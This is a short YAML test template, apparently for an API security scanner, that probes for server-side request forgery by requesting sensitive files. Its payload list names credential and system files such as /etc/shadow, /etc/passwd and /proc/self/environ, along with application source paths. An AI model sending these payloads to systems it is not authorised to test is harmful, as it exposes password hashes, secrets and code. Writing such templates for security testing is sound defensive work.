id: fetch_sensitive_files
info:
  name: Fetch sensitive files via SSRF
  author: akto
  severity: high

requests:
  - method: "{{Method}}"
    path:
      - "{{BaseURL}}"
    body: "{{Body}}"

    payloads:
      filename:
        - "/etc/passwd"
        - "/etc/lsb-release" 
        - "/etc/shadow" 
        - "/etc/hosts" 
        - "/proc/self/environ"
        - "/proc/self/cmdline"
        - "/proc/self/cwd/index.php"
        - "/proc/self/cwd/application.py" 
        - "/proc/self/cwd/main.py"
        - "/proc/self/exe"